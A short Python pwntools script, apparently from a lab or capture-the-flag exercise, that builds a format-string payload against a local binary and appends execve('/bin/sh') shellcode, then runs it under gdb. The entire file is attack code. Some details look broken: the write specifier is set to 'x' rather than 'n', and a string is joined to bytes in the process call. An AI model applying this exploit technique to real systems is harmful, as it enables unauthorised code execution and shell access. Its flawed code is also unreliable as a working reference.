from pwn import *


first_2_bytes = p32(0xffffd63e)
last_2_bytes = p32(0xffffd63c)
first_2_bytes_shellcode_address = 0xffff
last_2_bytes_shellcode_address = 0xd578
offset = 0
shellcode = b"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
percent = b'%'
u_specifier = b'u'
n_specifier = b'x'
dollar = b'$'
first_dir_par = 6
second_dir_par = 7
payload = last_2_bytes + first_2_bytes + percent +\
        str(last_2_bytes_shellcode_address + offset - 8).encode() +\
        u_specifier + percent + str(first_dir_par).encode() + dollar +\
        n_specifier + percent +\
        str(first_2_bytes_shellcode_address - last_2_bytes_shellcode_address - offset).encode() +\
        u_specifier + percent + str(second_dir_par).encode() + dollar + n_specifier + shellcode
print('payload:', payload)
p = process('./format-string' + payload)
gdb.attach(p, 'b *main + 102')
p.interactive()
